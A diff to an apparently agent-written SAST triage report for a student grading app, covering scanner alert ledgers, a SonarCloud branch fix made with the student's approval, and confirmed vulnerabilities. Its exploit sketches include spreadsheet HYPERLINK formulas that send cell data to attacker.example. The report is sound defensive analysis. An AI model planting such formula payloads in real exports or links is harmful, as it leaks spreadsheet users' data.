@@ -12,7 +12,7 @@
 | Prompt summary | "write sast-triage-report.md … put every Semgrep, SonarQube and Trivy alert in a ledger as a true or false positive … review the code by hand and document at least 3 confirmed vulnerabilities from different layers, each with its CWE ID, file/line and root cause" (full verbatim prompt in [`/.ai_logs/pa2-session-log.md`](../.ai_logs/pa2-session-log.md)) |
 | Session link | https://claude.ai/code/session_01Mj79JHpoGSSrKQhMcsCbL5 |
 | Human verification status | **PENDING.** Student must re-check each finding against the code before the PA2 release tag |
-| SonarQube data source | Read on 2026-11-17 through the SonarCloud Web API in the Claude desktop app's built-in browser, signed in as the student (read-only queries; no settings changed). See section 2.2 |
+| SonarQube data source | Read on 2026-11-17 through the SonarCloud Web API in the Claude desktop app's built-in browser, signed in as the student. With the student's approval the agent fixed the project's branch setup (section 2.2) and re-ran the pipeline before triaging |
 
 ---
 <!-- /AI_DELIVERABLE_METADATA -->
@@ -20,7 +20,7 @@
 # SAST Triage Report — Peer Review & Evaluation Gateway (PA2 naive baseline)
 
 **Target:** `project-assignment-2/functional-codebase/` at commit `b26062f` (the happy-path build).
-**Scan run:** GitHub Actions [run 44004909266](https://github.com/saniyaab/MET763-PeerReviewandEvaluation/actions/runs/44004909266), log saved at [`pipeline-logs/pa2-run-44004909266.log`](pipeline-logs/pa2-run-44004909266.log).
+**Scan runs:** Semgrep and Trivy from GitHub Actions [run 44004909266](https://github.com/saniyaab/MET763-PeerReviewandEvaluation/actions/runs/44004909266) ([log](pipeline-logs/pa2-run-44004909266.log)). SonarQube from [run 44027046164](https://github.com/saniyaab/MET763-PeerReviewandEvaluation/actions/runs/44027046164) ([log](pipeline-logs/pa2-run-44027046164.log)), the first run after the SonarCloud branch fix in section 2.2; it re-ran the same application code (commit `caf67b5`, no `functional-codebase/` changes since `b26062f`) and Semgrep/Trivy results were identical.
 **Scope note:** this file is the baseline for PA3 remediation (every confirmed CWE in section 4 must be fixed in PA3) and for the classmate who runs a secure prompt against this repository.
 
 ## 1. Summary
@@ -28,13 +28,13 @@
 | Source | Raw alerts | True positive | False positive | Notes |
 |---|---|---|---|---|
 | Semgrep 1.150.0 (6 rulesets, 136 rules, 19 files) | **0** | 0 | 0 | Clean scan, but 12 confirmed vulnerabilities exist (section 4): every one is a scanner **false negative** |
-| SonarQube Cloud (Sonar way core: 248 TypeScript + 37 Docker rules, 13 files, 1,246 lines) | **0** issues, **0** hotspots | 0 | 0 | **Result not trustworthy:** SonarCloud analyzes `main` as a short-lived branch against a missing reference branch (section 2.2) |
+| SonarQube Cloud (Sonar way core: 248 TypeScript + 37 Docker rules, 13 files, 1,246 lines) | **1** vulnerability (BLOCKER), 0 hotspots, 0 bugs, 0 code smells | 0 as reported (XSS) | 1 | Reported as reflected XSS; false positive for XSS, but its taint path is a real **reflected CSV formula injection**, added to V-08. Earlier runs returned an inconclusive 0 because of a branch misconfiguration (section 2.2) |
 | Trivy 0.69.3 — filesystem (`package-lock.json`, secrets, misconfig) | 0 | 0 | 0 | App dependencies clean (`express`, `pg` and their transitive packages) |
 | Trivy 0.69.3 — Dockerfile config | 0 | 0 | 0 | Non-root `USER node`, multi-stage, healthcheck present |
 | Trivy 0.69.3 — container image | 24 | 24 | 0 | All in the `node:22-alpine` base image: 1 Alpine package, 23 in packages bundled with the global npm CLI. None in the app's own `node_modules` (79 packages, 0 findings) |
 | **Manual code review** | – | **12 confirmed** | – | Across 7 layers: authentication, authorization, input, business logic/state, database, output encoding, error handling, resource management |
 
-The scanners and the code tell opposite stories: automated SAST found nothing in the application, while manual review confirmed critical flaws in authentication, authorization and grading logic. Section 3 explains why.
+The scanners and the code tell opposite stories: automated SAST found one mislabeled issue in the application, while manual review confirmed critical flaws in authentication, authorization and grading logic. Section 3 explains why.
 
 ## 2. Raw alert ledger
 
@@ -61,26 +61,43 @@ Command (from `.github/workflows/devsecops.yml`): `semgrep scan --config p/types
 
 ### 2.2 SonarQube Cloud
 
-**How the data was collected.** sonarcloud.io is blocked from the agent's workspace, so the student signed in to SonarCloud in the Claude desktop app's built-in browser and the agent read the project through SonarCloud's Web API from that page (read-only `GET` requests: `issues/search`, `hotspots/search`, `measures/component`, `components/tree`, `project_branches/list`, `qualityprofiles/search`, `ce/activity`, `ce/task`). Nothing in SonarCloud was changed.
+**How the data was collected.** sonarcloud.io is blocked from the agent's workspace, so the student signed in to SonarCloud in the Claude desktop app's built-in browser, and the agent read the project through SonarCloud's Web API from that page (`issues/search`, `hotspots/search`, `measures/component`, `components/tree`, `project_branches/list`, `qualityprofiles/search`, `ce/activity`, `ce/task`).
+
+#### First reading: inconclusive (misconfigured branch)
+
+The first three analyses of `main` (2026-11-17 02:43, 02:47 and 05:33 UTC) returned **0 issues and 0 hotspots**, but every one carried this warning:
+
+> `Could not find ref 'bootstrap-lockfile' in refs/heads, refs/remotes, refs/remotes/upstream or refs/remotes/origin. You may see unexpected issues and changes.`
+
+`project_branches/list` showed why. SonarCloud's main branch for the project was still `bootstrap-lockfile`, a temporary branch the agent pushed in PA1 to generate `package-lock.json` (recorded in `/code_AI_history.md` Entry 2) and later deleted (`git ls-remote --heads origin` lists only `main`). `main` itself was registered as a **short-lived** branch merging into `bootstrap-lockfile`. SonarCloud reports issues on a short-lived branch only for code that changed relative to its merge branch, and that branch could not be found, so the zero was not evidence of clean code.
+
+#### Fix and re-run (approved by the student, 2026-11-17 about 05:50 UTC)
+
+1. Deleted SonarCloud's short-lived `main` branch entry (`POST api/project_branches/delete`). This removed only the three inconclusive analyses above.
+2. Renamed the main branch from `bootstrap-lockfile` to `main` (`POST api/project_branches/rename`). `project_branches/list` then showed a single branch: `main`, main branch, type LONG.
+3. Re-ran the pipeline manually: [run 44027046164](https://github.com/saniyaab/MET763-PeerReviewandEvaluation/actions/runs/44027046164) on commit `caf67b5`. Build, 5/5 unit tests and 20/20 integration tests passed; the SonarCloud task finished on branch `main` (LONG) with **no warnings**.
+
+No application code changed between the inconclusive runs and this run.
+
+#### Result
 
 | What was checked | Result |
 |---|---|
-| Analyses of `main` | 3 successful analyses on 2026-11-17 (02:43, 02:47, 05:33 UTC); the latest is commit `c5e2f36` |
 | Files analyzed (source) | 13: the 12 `functional-codebase/src/*.ts` files and `Dockerfile`. `docker-compose.yml` is listed in `sonar.sources` but was not analyzed as a source file; `tests/` is configured as test code |
 | Size | 1,246 lines of code |
 | Quality profile | "Sonar way core": 248 TypeScript rules, 37 Docker rules |
-| Issues (`issues/search`, `branch=main`, all statuses) | **0** (0 bugs, 0 vulnerabilities, 0 code smells) |
-| Security hotspots (`hotspots/search`, to review and reviewed) | **0** |
-| Quality gate | OK |
-| **Analysis warning (every run)** | `Could not find ref 'bootstrap-lockfile' in refs/heads, refs/remotes, refs/remotes/upstream or refs/remotes/origin. You may see unexpected issues and changes.` |
-
-**Why the zero is not a real "clean" result.** `project_branches/list` shows that SonarCloud's *main* branch for this project is still `bootstrap-lockfile` (a temporary branch the agent pushed in PA1 to generate `package-lock.json`, recorded in `/code_AI_history.md` Entry 2, and since deleted: `git ls-remote --heads origin` now lists only `main`), and that `main` is registered as a **SHORT** (short-lived) branch with `mergeBranch: bootstrap-lockfile`. SonarCloud reports issues on a short-lived branch only for code that changed relative to its merge branch. Because the CI checkout cannot find `bootstrap-lockfile`, that comparison fails (the warning above), and the 0 issues / 0 hotspots cannot be taken as evidence that the rules found nothing. With 248 rules over 1,246 lines, at least some maintainability findings would normally be expected.
+| Issues | **1** vulnerability (below); 0 bugs; 0 code smells |
+| Security hotspots | **0** |
 
 | ID | Rule | Type / severity | File:line | Classification | Reasoning |
 |---|---|---|---|---|---|
-| SQ-00 | *(no issues or hotspots returned)* | – | – | **Inconclusive (tool misconfiguration)** | No alerts to classify as TP or FP. The 12 manual findings in section 4 are SonarQube **false negatives** for this run, partly because of the branch setup and partly for the reasons in section 3 |
+| SQ-01 | `tssecurity:S5131` "Endpoints should not be vulnerable to reflected cross-site scripting (XSS) attacks" | Vulnerability / BLOCKER (Security: Blocker) | `src/routes/evaluations.ts:119` | **False positive as XSS (CWE-79). The underlying data flow is a true positive for CWE-1236, merged into V-08** | See below |
 
-**Fix (pipeline configuration, not application code):** in SonarCloud → project *Administration → Branches and Pull Requests*, make `main` the main branch (rename the main branch to `main`, or delete `bootstrap-lockfile` and set `main` as main), then re-run the pipeline and re-triage the result into this table. Until then, SonarQube's contribution to this baseline is "0 alerts, inconclusive".
+**Taint path reported by SonarCloud for SQ-01:** source `req.query.lab_id` (`src/routes/evaluations.ts:106`, via `qs()` at lines 22-24) → `filter.lab_id` → `report.scope.lab_id` (`src/services/aggregation.ts:299`) → CSV header line `["# generated_at", …, "course_id", …, "lab_id", report.scope.lab_id]` (`aggregation.ts:322`) → `csvCell` (lines 308-311) → `lines.join` (line 357) → sink `res.type("text/csv").send(...)` (`evaluations.ts:119`). The same path exists for `course_id`.
+
+**Why it is not XSS:** the sink sends `Content-Type: text/csv; charset=utf-8` with `Content-Disposition: attachment` (set by `res.attachment()` at `evaluations.ts:118`). The CI integration test "GET /reports?course_id= exports one consolidated CSV report file" checks both headers on every run. Browsers therefore download the response instead of rendering it, and a `<script>` in `lab_id` never executes. The response has no `X-Content-Type-Options: nosniff` header; adding it is worthwhile defense in depth (M-08 in `security-analysis.md`), but its absence does not make this finding exploitable as XSS.
+
+**What is real:** the reflected value lands **unescaped in the downloaded CSV**. `buildReport` returns the header line even when no project matches, so a link such as `/api/v1/evaluations/reports?lab_id==HYPERLINK("http://attacker.example/?"%26A6,"Open")` produces a report whose second line contains a live spreadsheet formula. If an instructor is tricked into opening that link, the downloaded file attacks their spreadsheet the same way the stored comment payload does. This is CWE-1236, recorded in section 4 as the **reflected variant of V-08**. The scanner found a real data flow but named the wrong weakness for this response type.
 
 ### 2.3 Trivy
 
@@ -124,7 +141,7 @@ Command (from `.github/workflows/devsecops.yml`): `semgrep scan --config p/types
 3. **Business logic is invisible to SAST.** Grade inflation via out-of-range scores, ballot-stuffing peer reviews, self-assigned faculty roles and the TOCTOU on the rubric "in use" rule need knowledge of the grading domain.
 4. **Data flows across files.** User input enters in `routes/evaluations.ts`, is scored in `services/scoring.ts` and leaves as CSV in `services/aggregation.ts`. Community Semgrep rules are mostly single-file and do not track a JSON body field into a CSV export.
 5. **Tests were skipped.** Semgrep's default ignore list excluded `tests/`, which is harmless here but means test code is unreviewed by SAST.
-6. **SonarQube compared against a branch that no longer exists.** Its analysis of `main` ran as a short-lived branch against the deleted `bootstrap-lockfile` branch, so its zero result is inconclusive (section 2.2). This configuration flaw came from the agent's PA1 lockfile workaround (the first SonarCloud analysis ran on `bootstrap-lockfile`, which became the project's main branch) and went unnoticed because the scan job is non-blocking and the log only says `ANALYSIS SUCCESSFUL`.
+6. **SonarQube first compared against a branch that no longer exists.** Its analysis of `main` ran as a short-lived branch against the deleted `bootstrap-lockfile` branch, so its zero result is inconclusive (section 2.2). This configuration flaw came from the agent's PA1 lockfile workaround (the first SonarCloud analysis ran on `bootstrap-lockfile`, which became the project's main branch) and went unnoticed because the scan job is non-blocking and the log only says `ANALYSIS SUCCESSFUL`. After the fix (section 2.2) SonarQube found one real data flow, but only for a query parameter in a single route, and none of the missing-authorization or business-logic flaws.
 
 ## 4. Confirmed vulnerabilities (manual review)
 
@@ -141,7 +158,7 @@ Severity uses likelihood × impact for this service (a campus grading system whe
 | V-05 | Input validation | Scores and rubric numbers are not type- or range-checked: grades above 100, negative grades, crash on non-numeric score | **CWE-1284** Improper Validation of Specified Quantity in Input (related CWE-20) | High | `src/services/reviews.ts:112-118, 156-161`; `src/services/scoring.ts:84-90, 119-122`; `src/services/rubrics.ts:77` | C |
 | V-06 | Business logic | Unlimited reviews per reviewer per project, and project members can review their own project | **CWE-837** Improper Enforcement of a Single, Unique Action | High | `src/schema.ts:85-97`; `src/services/reviews.ts:132-165` | C |
 | V-07 | State machine / concurrency | Check-then-act races on the rubric "in use" lock and on the governing-rubric lookup | **CWE-367** Time-of-check Time-of-use Race Condition (related CWE-362) | Medium | `src/services/rubrics.ts:187-218`; `src/services/reviews.ts:134-163` | C |
-| V-08 | Output encoding | CSV formula injection in the consolidated report | **CWE-1236** Improper Neutralization of Formula Elements in a CSV File | High | `src/services/aggregation.ts:308-312, 346, 354` | C |
+| V-08 | Output encoding | CSV formula injection in the consolidated report (stored via comments/criterion titles; reflected via `course_id`/`lab_id`) | **CWE-1236** Improper Neutralization of Formula Elements in a CSV File | High | `src/services/aggregation.ts:308-312, 322, 346, 354`; `src/routes/evaluations.ts:106, 119` | C + SonarQube SQ-01 (taint path) |
 | V-09 | Error handling | Raw database and runtime error messages returned to the client | **CWE-209** Generation of Error Message Containing Sensitive Information | Medium | `src/app.ts:53-57` | C |
 | V-10 | Resource management | Unbounded criteria nesting (synchronous recursion) and unpaginated result sets | **CWE-674** Uncontrolled Recursion; **CWE-770** Allocation of Resources Without Limits | Medium | `src/services/scoring.ts:63-67, 84-96`; `src/services/rubrics.ts:65-83`; `src/routes/evaluations.ts:45-52, 79-87, 103-120` | C |
 | V-11 | Database | App connects as the PostgreSQL superuser and runs DDL at every start | **CWE-250** Execution with Unnecessary Privileges | Medium | `docker-compose.yml:24, 43-44`; `src/schema.ts:109-110`; `src/server.ts:28` | C |
@@ -202,7 +219,8 @@ Layers covered: Authentication (V-01), Authorization (V-02, V-03, V-04), Input (
 
 - **Where:** `csvCell` `src/services/aggregation.ts:308-312` only adds quotes when a value contains `"`, `,` or a newline. Review comments (`354`) and criterion titles (`346`) are written verbatim.
 - **Root cause:** CSV was treated as a data format, not as something an instructor will open in Excel or Google Sheets.
-- **Exploit sketch:** a peer submits `comment: "=HYPERLINK(\"http://attacker.example/?\"&A2,\"View rubric\")"`. When an instructor downloads `/reports?course_id=CS763&include_comments=true` and opens it, the cell becomes a live formula (quoting does not stop evaluation).
+- **Exploit sketch (stored):** a peer submits `comment: "=HYPERLINK(\"http://attacker.example/?\"&A2,\"View rubric\")"`. When an instructor downloads `/reports?course_id=CS763&include_comments=true` and opens it, the cell becomes a live formula (quoting does not stop evaluation).
+- **Exploit sketch (reflected):** the header line at `aggregation.ts:322` echoes `course_id` and `lab_id` from the query string. A link to `/reports?lab_id==HYPERLINK(...)` sent to an instructor yields a downloaded report with the formula in its second line, even though no project matches. SonarQube traced exactly this path (SQ-01), though it labelled it XSS.
 
 ### V-09 — Internal error messages returned to clients (CWE-209) · Medium
 
